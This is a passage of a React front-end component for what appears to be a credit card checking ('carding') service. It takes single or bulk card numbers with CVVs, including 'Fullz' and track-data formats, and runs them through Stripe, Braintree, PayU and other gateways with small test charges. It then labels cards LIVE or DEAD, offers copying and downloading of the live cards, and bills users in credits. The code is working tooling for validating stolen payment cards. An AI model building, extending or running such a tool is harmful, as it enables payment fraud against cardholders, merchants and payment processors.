                      <Label htmlFor="payuAmount" className="text-xs font-semibold text-orange-400">Charge Amount (₹)</Label>
                    </div>
                    <div className="flex items-center gap-2">
                      <Input
                        id="payuAmount"
                        type="number"
                        min="1"
                        max="500"
                        value={payuAmount}
                        onChange={(e) => {
                          const val = parseInt(e.target.value) || 1;
                          setPayuAmount(Math.min(500, Math.max(1, val)));
                        }}
                        className="font-mono w-24"
                        disabled={checking}
                      />
                      <div className="flex gap-1">
                        {[1, 5, 10, 50, 100].map((amt) => (
                          <button
                            key={amt}
                            type="button"
                            onClick={() => setPayuAmount(amt)}
                            className={`px-2 py-1 text-xs rounded border ${
                              payuAmount === amt 
                                ? 'bg-orange-500 text-white border-orange-500' 
                                : 'bg-secondary border-border hover:border-orange-500/50'
                            }`}
                            disabled={checking}
                          >
                            ₹{amt}
                          </button>
                        ))}
                      </div>
                    </div>
                    <p className="text-[10px] text-muted-foreground">
                      This amount will be charged to the card. Range: ₹1 - ₹500
                    </p>
                  </div>
                )}
              </div>

              {result && (
                <div className={`p-4 rounded-lg border ${
                  result.status === "live" 
                    ? "bg-green-500/10 border-green-500/30" 
                    : result.status === "dead"
                      ? "bg-red-500/10 border-red-500/30"
                      : "bg-yellow-500/10 border-yellow-500/30"
                }`}>
                  {/* Card with status badge */}
                  <div className="flex items-center gap-2 mb-3">
                    <span className={`px-2 py-0.5 rounded text-xs font-bold ${
                      result.status === "live" 
                        ? "bg-green-500 text-white" 
                        : result.status === "dead"
                          ? "bg-red-500 text-white"
                          : "bg-yellow-500 text-black"
                    }`}>
                      {result.status === "live" ? "LIVE" : result.status === "dead" ? "DEAD" : "UNKNOWN"}
                    </span>
                    <span className="font-mono text-sm text-foreground font-semibold">
                      {result.displayCard || result.card || `${cardNumber.replace(/\s/g, '')}|${expMonth}|${expYear}|${cvv}`}
                    </span>
                    {result.card && (
                      <button
                        onClick={() => {
                          navigator.clipboard.writeText(result.displayCard || result.card || '');
                          toast.success("Copied card");
                        }}
                        className="p-1 hover:bg-secondary rounded"
                      >
                        <Copy className="h-3.5 w-3.5 text-muted-foreground" />
                      </button>
                    )}
                  </div>

                  {/* Separator line */}
                  <div className="border-t border-dashed border-muted-foreground/30 my-3" />

                  {/* Details in mono bold italic style */}
                  <div className="space-y-1.5 font-mono text-xs">
                    <div className="flex">
                      <span className="w-24 text-muted-foreground font-bold italic">STATUS</span>
                      <span className="text-muted-foreground font-bold italic mr-2">:</span>
                      <span className={`font-bold italic ${
                        result.status === "live" 
                          ? "text-green-500" 
                          : result.status === "dead"
                            ? "text-red-500"
                            : "text-yellow-500"
                      }`}>
                        {result.status === "live" ? "CHARGED" : result.status === "dead" ? "DECLINED" : "UNKNOWN"}
                      </span>
                    </div>
                    
                    <div className="flex">
                      <span className="w-24 text-muted-foreground font-bold italic">AMOUNT</span>
                      <span className="text-muted-foreground font-bold italic mr-2">:</span>
                      <span className="text-foreground font-bold italic">
                        {selectedGateway?.id === "payu_charge" 
                          ? `₹${payuAmount} CHARGE` 
                          : selectedGateway?.id === "paygate_charge"
                            ? "$14 CHARGE"
                            : selectedGateway?.id === "stripe_charge"
                              ? "$8 CHARGE"
                              : selectedGateway?.type === "charge" 
                                ? "$1 CHARGE" 
                                : "$0 AUTH"}
                      </span>
                    </div>
                    
                    <div className="flex">
                      <span className="w-24 text-muted-foreground font-bold italic">RESPONSE</span>
                      <span className="text-muted-foreground font-bold italic mr-2">:</span>
                      <span className="text-foreground font-bold italic">
                        {result.apiResponse || result.message}
                      </span>
                    </div>
                    
                    <div className="flex">
                      <span className="w-24 text-muted-foreground font-bold italic">BIN</span>
                      <span className="text-muted-foreground font-bold italic mr-2">:</span>
                      <span className="text-foreground font-bold italic">
                        {binInfo.brand.toUpperCase()} / {binInfo.type} / {binInfo.country} {binInfo.countryCode && binInfo.countryCode !== 'XX' ? String.fromCodePoint(...[...binInfo.countryCode.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt(0))) : ''}
                      </span>
                    </div>
                    
                    <div className="flex">
                      <span className="w-24 text-muted-foreground font-bold italic">GATEWAY</span>
                      <span className="text-muted-foreground font-bold italic mr-2">:</span>
                      <span className="text-foreground font-bold italic">
                        {selectedGateway?.name || result.gateway}
                        {/* Show which API was used for combined gateway */}
                        {selectedGateway?.id === "combined_auth" && result.usedApi && (
                          <span className={`ml-2 px-1.5 py-0.5 rounded text-[10px] font-bold ${
                            result.usedApi === 'stripe' 
                              ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' 
                              : result.usedApi === 'b3'
                                ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                                : 'bg-gray-500/20 text-gray-400 border border-gray-500/30'
                          }`}>
                            via {result.usedApi === 'stripe' ? 'STRIPE' : result.usedApi === 'b3' ? 'B3' : result.usedApi.toUpperCase()}
                          </span>
                        )}
                      </span>
                    </div>
                    
                    <div className="flex">
                      <span className="w-24 text-muted-foreground font-bold italic">TIME</span>
                      <span className="text-muted-foreground font-bold italic mr-2">:</span>
                      <span className="text-foreground font-bold italic">
                        {format(new Date(), 'yyyy-MM-dd HH:mm')} UTC
                      </span>
                    </div>
                    
                    {/* Raw API Response - Expandable */}
                    {result.rawResponse && (
                      <div className="mt-3 pt-3 border-t border-dashed border-muted-foreground/30">
                        <details className="group">
                          <summary className="cursor-pointer flex items-center gap-2 text-muted-foreground font-bold italic text-[11px] hover:text-foreground transition-colors">
                            <ChevronRight className="h-3 w-3 transition-transform group-open:rotate-90" />
                            RAW API RESPONSE
                          </summary>
                          <div className="mt-2 p-2 bg-black/30 rounded border border-border overflow-x-auto">
                            <pre className="text-[10px] text-green-400 whitespace-pre-wrap break-all font-mono">
                              {(() => {
                                try {
                                  const parsed = JSON.parse(result.rawResponse || '{}');
                                  return JSON.stringify(parsed, null, 2);
                                } catch {
                                  return result.rawResponse;
                                }
                              })()}
                            </pre>
                          </div>
                        </details>
                      </div>
                    )}
                  </div>
                </div>
              )}

              <div className="flex gap-2">
                <Button
                  variant="outline"
                  className="flex-1"
                  onClick={clearForm}
                  disabled={checking}
                >
                  Clear
                </Button>
                <Button
                  className="flex-1 btn-primary"
                  onClick={performCheck}
                  disabled={checking || !cardNumber}
                >
                  {checking ? (
                    <>
                      <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                      Checking...
                    </>
                  ) : (
                    <>
                      <Zap className="h-4 w-4 mr-2" />
                      Check (1-2 Credits)
                    </>
                  )}
                </Button>
              </div>

              <p className="text-[10px] text-muted-foreground text-center">
                Dead: {CREDIT_COST_DEAD} credit • Live: {CREDIT_COST_LIVE} credits • Errors: Free
              </p>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Bulk Card Check */}
        <TabsContent value="bulk" className="mt-4 space-y-4">
          <Card className="bg-card border-border max-w-2xl">
            <CardContent className="p-4 sm:p-6 space-y-4">
              <div className="flex items-center justify-between mb-3">
                <div className="flex items-center gap-2">
                  <Label className="text-xs">Workers:</Label>
                  <select
                    value={workerCount}
                    onChange={(e) => setWorkerCount(Number(e.target.value))}
                    disabled={bulkChecking}
                    className="h-7 px-2 text-xs bg-secondary border border-border rounded"
                  >
                    {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10].map(n => (
                      <option key={n} value={n}>{n} Thread{n > 1 ? 's' : ''}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <input
                    type="file"
                    ref={fileInputRef}
                    accept=".txt,.csv"
                    onChange={handleFileUpload}
                    className="hidden"
                    disabled={bulkChecking}
                  />
                  <Button
                    type="button"
                    variant="outline"
                    size="sm"
                    className="h-6 px-2 text-[10px] gap-1"
                    onClick={() => fileInputRef.current?.click()}
                    disabled={bulkChecking}
                  >
                    <Paperclip className="h-3 w-3" />
                    Attach File
                  </Button>
                </div>
              </div>

              {/* PayU Custom Amount Input for Bulk */}
              {selectedGateway?.id === "payu_charge" && (
                <div className="p-3 rounded-lg bg-orange-500/10 border border-orange-500/30 space-y-2">
                  <div className="flex items-center gap-2">
                    <Label className="text-xs font-semibold text-orange-400">Charge Amount (₹)</Label>
                  </div>
                  <div className="flex items-center gap-2">
                    <Input
                      type="number"
                      min="1"
                      max="500"
                      value={payuAmount}
                      onChange={(e) => {
                        const val = parseInt(e.target.value) || 1;
                        setPayuAmount(Math.min(500, Math.max(1, val)));
                      }}
                      className="font-mono w-24"
                      disabled={bulkChecking}
                    />
                    <div className="flex gap-1 flex-wrap">
                      {[1, 5, 10, 50, 100].map((amt) => (
                        <button
                          key={amt}
                          type="button"
                          onClick={() => setPayuAmount(amt)}
                          className={`px-2 py-1 text-xs rounded border ${
                            payuAmount === amt 
                              ? 'bg-orange-500 text-white border-orange-500' 
                              : 'bg-secondary border-border hover:border-orange-500/50'
                          }`}
                          disabled={bulkChecking}
                        >
                          ₹{amt}
                        </button>
                      ))}
                    </div>
                  </div>
                  <p className="text-[10px] text-muted-foreground">
                    Each card will be charged ₹{payuAmount}. Range: ₹1 - ₹500
                  </p>
                </div>
              )}

              <div>
                <Label className="text-xs">Cards (one per line)</Label>
                <Textarea
                  placeholder="Supports multiple formats:&#10;card|mm|yy|cvv&#10;card=YYMM (track data)&#10;card mm yyyy cvv&#10;Fullz data with card details"
                  value={bulkInput}
                  onChange={(e) => setBulkInput(e.target.value)}
                  className="mt-1 font-mono text-xs h-40 resize-none"
                  disabled={bulkChecking}
                />
                <p className="text-[10px] text-muted-foreground mt-1">
                  Formats: {selectedGateway?.type === "auth" ? "card|mm|yy, card=YYMM (CVC optional), " : ""}card|mm|yy|cvv, card mm yyyy cvv, Fullz — {parseCards(bulkInput, selectedGateway?.type === "auth").length} valid cards detected
                </p>
              </div>

              {bulkChecking && (
                <div className="space-y-3">
                  {/* Live Counter with Success Rate - Responsive */}
                  <div className="flex flex-wrap items-center justify-center gap-3 sm:gap-4 py-3 px-2 bg-gradient-to-r from-green-500/10 via-green-500/20 to-green-500/10 rounded-lg border border-green-500/30">
                    <div className="flex items-center gap-1.5 sm:gap-2">
                      <ShieldCheck className="h-4 w-4 sm:h-5 sm:w-5 text-green-500 animate-pulse" />
                      <span className="text-xs sm:text-sm text-muted-foreground">Live:</span>
                      <span 
                        key={bulkResults.filter(r => r.status === 'live').length}
                        className="text-xl sm:text-2xl font-bold text-green-500 animate-scale-in tabular-nums"
                      >
                        {bulkResults.filter(r => r.status === 'live').length}
                      </span>
                    </div>
                    <div className="hidden sm:block h-8 w-px bg-border" />
                    <div className="flex items-center gap-1.5 sm:gap-2">
                      <ShieldX className="h-4 w-4 sm:h-5 sm:w-5 text-red-500" />
                      <span className="text-xs sm:text-sm text-muted-foreground">Dead:</span>
                      <span className="text-base sm:text-lg font-semibold text-red-500 tabular-nums">
                        {bulkResults.filter(r => r.status === 'dead').length}
                      </span>
                    </div>
                    <div className="hidden sm:block h-8 w-px bg-border" />
                    {/* Live Success Rate */}
                    <div className="flex items-center gap-1.5 sm:gap-2">
                      <Activity className="h-4 w-4 sm:h-5 sm:w-5 text-primary" />
                      <span className="text-xs sm:text-sm text-muted-foreground">Rate:</span>
                      {(() => {
                        const liveCount = bulkResults.filter(r => r.status === 'live').length;
                        const deadCount = bulkResults.filter(r => r.status === 'dead').length;
                        const totalValid = liveCount + deadCount;
                        const rate = totalValid > 0 ? Math.round((liveCount / totalValid) * 100) : 0;
                        const rateColor = rate >= 70 ? 'text-green-500' : rate >= 40 ? 'text-yellow-500' : 'text-red-500';
                        return (
                          <span 
                            key={rate}
                            className={`text-base sm:text-lg font-bold ${rateColor} animate-scale-in tabular-nums`}
                          >
                            {totalValid > 0 ? `${rate}%` : '--'}
                          </span>
                        );
                      })()}
                    </div>
                  </div>
                  
                  <div className="flex flex-wrap items-center justify-between gap-2 text-[10px] sm:text-xs">
                    <span className="shrink-0">Progress: {bulkCurrentIndex}/{bulkTotal}</span>
                    <div className="flex items-center gap-2 sm:gap-3">
                      <span className="text-primary font-medium flex items-center gap-1 truncate max-w-[120px] sm:max-w-none">
                        <Clock className="h-3 w-3 shrink-0" />
                        <span className="truncate">{bulkEstimatedTime}</span>
                      </span>
                      <span className="shrink-0">{Math.round(bulkProgress)}%</span>
                    </div>
                  </div>
                  <Progress value={bulkProgress} className="h-2" />
                </div>
              )}

              <div className="flex gap-2">
                {!bulkChecking ? (
                  <>
                    <Button
                      variant="outline"
                      className="flex-1"
                      onClick={clearBulk}
                      disabled={!bulkInput && bulkResults.length === 0}
                    >
                      Clear
                    </Button>
                    <Button
                      className="flex-1 btn-primary"
                      onClick={startBulkCheck}
                      disabled={parseCards(bulkInput).length === 0}
                    >
                      <Zap className="h-4 w-4 mr-2" />
                      Check ({parseCards(bulkInput).length} cards, max {parseCards(bulkInput).length * CREDIT_COST_LIVE} credits)
                    </Button>
                  </>
                ) : (
                  <>
                    {bulkPaused ? (
                      <Button
                        variant="outline"
                        className="flex-1"
                        onClick={resumeBulkCheck}
                      >
                        <Play className="h-4 w-4 mr-2" />
                        Resume
                      </Button>
                    ) : (
                      <Button
                        variant="outline"
                        className="flex-1"
                        onClick={pauseBulkCheck}
                      >
                        <Pause className="h-4 w-4 mr-2" />
                        Pause
                      </Button>
                    )}
                    <Button
                      variant="destructive"
                      className="flex-1"
                      onClick={stopBulkCheck}
                    >
                      <Square className="h-4 w-4 mr-2" />
                      Stop
                    </Button>
                  </>
                )}
              </div>
            </CardContent>
          </Card>

          {/* Bulk Results */}
          {bulkResults.length > 0 && (
            <Card className="bg-card border-border max-w-2xl">
              <CardHeader className="p-4 pb-2">
                <div className="flex flex-col gap-3">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-sm font-semibold">Results</CardTitle>
                    <div className="flex items-center gap-2">
                      <Badge className="bg-green-500/20 text-green-500 border-green-500/30 text-xs">
                        {liveCount} Live
                      </Badge>
                      <Badge className="bg-red-500/20 text-red-500 border-red-500/30 text-xs">
                        {deadCount} Dead
                      </Badge>
                      {unknownCount > 0 && (
                        <Badge className="bg-yellow-500/20 text-yellow-500 border-yellow-500/30 text-xs">
                          {unknownCount} Unknown
                        </Badge>
                      )}
                    </div>
                  </div>
                  {/* Filter Buttons */}
                  <div className="flex items-center gap-2">
                    <span className="text-xs text-muted-foreground">Filter:</span>
                    <div className="flex gap-1">
                      <Button
                        variant={bulkResultFilter === "all" ? "default" : "outline"}
                        size="sm"
                        onClick={() => setBulkResultFilter("all")}
                        className="h-6 px-2 text-[10px]"
                      >
                        All ({bulkResults.length})
                      </Button>
                      <Button
                        variant={bulkResultFilter === "live" ? "default" : "outline"}
                        size="sm"
                        onClick={() => setBulkResultFilter("live")}
                        className={`h-6 px-2 text-[10px] ${bulkResultFilter === "live" ? "bg-green-600 hover:bg-green-700" : "text-green-500 border-green-500/50 hover:bg-green-500/10"}`}
                        disabled={liveCount === 0}
                      >
                        Live ({liveCount})
                      </Button>
                      <Button
                        variant={bulkResultFilter === "dead" ? "default" : "outline"}
                        size="sm"
                        onClick={() => setBulkResultFilter("dead")}
                        className={`h-6 px-2 text-[10px] ${bulkResultFilter === "dead" ? "bg-red-600 hover:bg-red-700" : "text-red-500 border-red-500/50 hover:bg-red-500/10"}`}
                        disabled={deadCount === 0}
                      >
                        Dead ({deadCount})
                      </Button>
                      <Button
                        variant={bulkResultFilter === "unknown" ? "default" : "outline"}
                        size="sm"
                        onClick={() => setBulkResultFilter("unknown")}
                        className={`h-6 px-2 text-[10px] ${bulkResultFilter === "unknown" ? "bg-yellow-600 hover:bg-yellow-700" : "text-yellow-500 border-yellow-500/50 hover:bg-yellow-500/10"}`}
                        disabled={unknownCount === 0}
                      >
                        Unknown ({unknownCount})
                      </Button>
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="p-4 pt-2 space-y-3">
                <ScrollArea className="h-[350px] sm:h-[450px] rounded border border-border">
                  <div className="p-3 space-y-3">
                    {bulkResults
                      .filter(r => bulkResultFilter === "all" || r.status === bulkResultFilter)
                      .map((r, i) => {
                        // Get BIN info for display
                        const cardNum = r.fullCard?.split('|')[0] || '';
                        const brand = r.brand || detectCardBrandLocal(cardNum).brand;
                        
                        return (
                          <div 
                            key={i} 
                            className={`p-3 rounded-lg border ${
                              r.status === "live" 
                                ? "bg-green-500/5 border-green-500/30" 
                                : r.status === "dead"
                                  ? "bg-red-500/5 border-red-500/30"
                                  : "bg-yellow-500/5 border-yellow-500/30"
                            }`}
                          >
                            {/* Header with status badge and card */}
                            <div className="flex items-center gap-2 mb-2">
                              <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                                r.status === "live" 
                                  ? "bg-green-500/20 text-green-500" 
                                  : r.status === "dead"
                                    ? "bg-red-500/20 text-red-500"
                                    : "bg-yellow-500/20 text-yellow-500"
                              }`}>
                                {r.status === "live" ? "LIVE" : r.status === "dead" ? "DEAD" : "UNKNOWN"}
                              </span>
                              <CardBrandLogo brand={brand} size="sm" />
                              <span className="font-mono text-xs text-foreground font-bold italic flex-1 truncate">
                                {r.fullCard}
                              </span>
                              <button
                                onClick={() => {
                                  navigator.clipboard.writeText(r.fullCard || '');
                                  toast.success("Card copied!");
                                }}
                                className="p-1 hover:bg-secondary rounded shrink-0"
                              >
                                <Copy className="h-3 w-3 text-muted-foreground" />
                              </button>
                            </div>
                            
                            {/* Separator */}
                            <div className="border-t border-dashed border-muted-foreground/30 my-2" />
                            
                            {/* Details in bold italic mono style */}
                            <div className="space-y-1 font-mono text-[10px]">
                              <div className="flex">
                                <span className="w-20 text-muted-foreground font-bold italic">STATUS</span>
                                <span className="text-muted-foreground font-bold italic mr-1">:</span>
                                <span className={`font-bold italic ${
                                  r.status === "live" ? "text-green-500" : r.status === "dead" ? "text-red-500" : "text-yellow-500"
                                }`}>
                                  {r.status === "live" ? "CHARGED" : r.status === "dead" ? "DECLINED" : "UNKNOWN"}
                                </span>
                              </div>
                              
                              <div className="flex">
                                <span className="w-20 text-muted-foreground font-bold italic">AMOUNT</span>
                                <span className="text-muted-foreground font-bold italic mr-1">:</span>
                                <span className="text-foreground font-bold italic">
                                  {selectedGateway?.type === "auth" ? "$0 AUTH" : selectedGateway?.id === "paygate_charge" ? "$14.00" : selectedGateway?.id === "payu_charge" ? `₹${payuAmount}` : selectedGateway?.id === "stripe_charge" ? "$8.00" : "$1.00"}
                                </span>
                              </div>
                              
                              {r.apiResponse && (
                                <div className="flex">
                                  <span className="w-20 text-muted-foreground font-bold italic shrink-0">RESPONSE</span>
                                  <span className="text-muted-foreground font-bold italic mr-1">:</span>
                                  <span className="text-foreground font-bold italic truncate">
                                    {r.apiResponse}
                                  </span>
                                </div>
                              )}
                              
                              <div className="flex">
                                <span className="w-20 text-muted-foreground font-bold italic">BIN</span>
                                <span className="text-muted-foreground font-bold italic mr-1">:</span>
                                <span className="text-foreground font-bold italic">
                                  {brand.toUpperCase()}
                                </span>
                              </div>
                              
                              <div className="flex">
                                <span className="w-20 text-muted-foreground font-bold italic">GATEWAY</span>
                                <span className="text-muted-foreground font-bold italic mr-1">:</span>
                                <span className="text-primary font-bold italic">
                                  {selectedGateway?.name || 'N/A'}
                                  {/* Show which API was used for combined gateway */}
                                  {selectedGateway?.id === "combined_auth" && r.usedApi && (
                                    <span className={`ml-1.5 px-1 py-0.5 rounded text-[8px] font-bold ${
                                      r.usedApi === 'stripe' 
                                        ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' 
                                        : r.usedApi === 'b3'
                                          ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                                          : 'bg-gray-500/20 text-gray-400 border border-gray-500/30'
                                    }`}>
                                      via {r.usedApi === 'stripe' ? 'STRIPE' : r.usedApi === 'b3' ? 'B3' : r.usedApi.toUpperCase()}
                                    </span>
                                  )}
                                </span>
                              </div>
                            </div>
                          </div>
                        );
                      })}
                  </div>
                </ScrollArea>

                <div className="grid grid-cols-3 gap-2">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => copyResults("live")}
                    disabled={liveCount === 0}
                    className="text-xs"
                  >
                    <Copy className="h-3 w-3 mr-1" />
                    Live
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => copyResults("dead")}
                    disabled={deadCount === 0}
                    className="text-xs"
                  >
                    <Copy className="h-3 w-3 mr-1" />
                    Dead
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => downloadResults("all")}
                    className="text-xs"
                  >
                    <Download className="h-3 w-3 mr-1" />
                    All
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default Gateways;
